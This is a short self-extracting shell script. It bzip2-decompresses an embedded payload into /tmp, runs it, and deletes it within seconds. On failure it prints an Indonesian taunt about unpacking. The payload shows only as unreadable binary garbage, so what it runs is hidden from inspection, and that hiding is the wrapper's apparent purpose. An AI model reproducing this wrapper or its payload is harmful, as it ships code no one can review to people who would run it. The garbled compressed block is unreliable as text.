#!/bin/sh
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? $0; exit 1
fi; exit $res
BZh91AY&SY�e`�  2_� }c�a'S���0Kd�4� ���L� 0M21���h���I��    ��E'��ބ2�������A��uU,MiM!ʫ�*��X#Ѹ(�O@����ꔫ��������L�U����FMHE�Rᎌ8��Ca0�`���mhj�m;��%�����A�n��Դ.)�/��7�1�p�w�)�C�!)�>�� �|[!�9�<��3�3n�r�����Bߚ:^%�ᓛ�3MU��k�qx��b����"LdPVo*"�H�оr [h��R@'��%`�v�HV,D���w���XN�W)�*;�*ե�`��[i5� a�I���E��V��'tT�(�1M�l�%v9��lgYzID�r1-Й��'�B�)�4���8������)�{+`